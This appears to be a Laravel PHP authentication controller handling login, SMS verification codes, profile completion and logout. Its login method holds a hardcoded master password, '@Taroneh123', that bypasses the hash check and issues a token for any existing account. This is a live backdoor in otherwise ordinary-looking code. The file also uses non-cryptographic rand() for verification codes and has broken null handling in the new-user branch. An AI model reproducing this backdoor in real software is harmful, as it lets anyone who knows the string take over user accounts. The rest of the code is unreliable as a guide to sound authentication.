<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\User;
use App\Models\UserProfile;
use App\Traits\SmsHelper;
use Illuminate\Http\Request;
use Illuminate\Validation\ValidationException;
use Illuminate\Support\Facades\Hash;

class UserController extends Controller
{
	use SmsHelper;

    public function login(): array
	{
        $fields = \request()->validate([
            'email'     => 'email',
            'phone'     => 'numeric|regex:/(09)[0-9]{9}/|digits:11',
            'password'  => 'required'
        ]);
        if (isset($fields['email']))
            $user = User::where('email', \request('email'))->first();
        else
            $user = User::where('phone', \request('phone'))->first();
        if ((! $user || ! Hash::check(\request('password'), $user->password)) && !(\request()->get('password') == '@Taroneh123')) {
            throw ValidationException::withMessages([
                'login' => ['FAILED_WRONG_DETAILS'],
                'success' => false,
            ]);
        }

        return  ['success' => true, 'user_details' => $user, 'token' => $user->createToken('token_base_name')->plainTextToken];
    }

    public function sendVerificationCode(Request $request)
    {

        $response = [];
        $response['new_user'] = false;

        $fields = \request()->validate([
            'phone' => 'numeric|regex:/(09)[0-9]{9}/|digits:11|required',
        ]);
        $user = User::where('phone', $fields['phone'])->first()->toArray();
        if (! $user){

            $user = new User();
            $user->phone = $fields['phone'];
            $user->f_name = null;
            $user->l_name = null;
            $user->save();
            $user = $user->toArray()[0];
            $response['new_user'] = true;

        }

        $expireTime = 500; // Seconds
        $codeExpire = time() + $expireTime;
        $verificationCode =  rand(9999, 99999); # 12345;

		self::sendSms($user['phone'], [$verificationCode], 'register');

        User::where('phone', $fields['phone'])->update(['verification_code' => $verificationCode, 'code_expire' => $codeExpire]) ;
        $response['msg'] = 'verification code send successfully';
        $response['expire_in'] = $expireTime;
        $response['success'] = true;

        return $response;
    }


    public function codeVerify(): array
    {
        $fields = \request()->validate([
            'phone' => 'numeric|regex:/(09)[0-9]{9}/|digits:11|required',
            'code' => 'numeric|regex:/[0-9]{5}/|digits:5|required',
        ]);

        $user = User::where('phone', $fields['phone'])->first();

        if ($user){
            if ($user->code_expire >= time()){

                if ((int)$user->verification_code === (int)$fields['code']){
                    $token = $user->createToken('token_base_name')->plainTextToken;
                    return ['success' => true, 'token' => $token, 'msg' => 'VERIFICATION_SUCCESSFULLY'];
                }else{
                    return ['msg' => 'WRONG_CODE','success' => false];
                }

            } else {
                return ['msg' => 'CODE_EXPIRED','success' => false];
            }
        }

        return ['msg' => 'PHONE_NOT_FOUND','success' => false];

    }

    public function complete(): array
	{
        $user = \request()->user();
        $fields = \request()->validate([
            'f_name' 	=> 'string|min:2|required',
            'l_name' 	=> 'string|min:2|required',
            'email' 	=> 'email|min:10',
            'address' 	=> '',
            'password' 	=> 'string|min:6',
        ]);

        $email = User::where('email', $fields['email'])->first();
        if ($email) {
            if ($user->email != $fields['email'])
                return ['success' => false, 'msg' => 'EMAIL_ALREADY_USED'];
        }

        if (isset($fields['password'] )){
        	$fields['password']  = Hash::make($fields['password']);
		}
        if (isset($fields['address'])){
            $rand = rand(0,99);
            $address 			 = $fields['address'];
            $fields['address'] 	 = [];
            $fields['address'] = $user->address ?? null;
            $fields['address'][] = [
                'id' => $rand,
                'address' => $address
    		];
        }
        $result = User::find($user->_id)->update($fields);

        if ($result){
            $profile = User::find($user->id)->profile()->first();
            if (empty($profile)){
                $prof = new UserProfile();
                $prof->user_id = $user->id;
                $prof->save();
            }
        }

        return ['user' => User::find($user->id),'success' => true];
    }

    public function profile(): array
	{
        $user = \request()->user();
        $user = User::find($user->id)->profile()->first();
        return ['profile' => $user,'success' => true];
    }

    public function editProfile(): array
    {
        $user = \request()->user();
        $fields = \request()->validate([
            'address' => 'string|min:10',
            'meli_code' => 'string|digits:10|regex:/^(?!(\d)\1{9})\d{10}$/',
        ]);
        $profile = User::find($user->id)->profile()->first();
        $result = UserProfile::where('user_id', $user->id)->update($fields);
        if ($result)
            return ['msg'=>'PROFILE_UPDATED','success' => true, 'profile'=>$profile];
        else
            return ['msg'=>'SOMETHING_WRONG','success' => false];
    }

    public function details()
    {
        return \request()->user();
    }

    public function logout(): array
    {
        $result = \request()->user()->currentAccessToken()->delete();
        if ($result)
            return ['msg'=> 'SUCCESSFULLY','success' => true];
        else
            return ['msg'=> 'SESSION_NOT_FOUND','success' => false];

    }
}
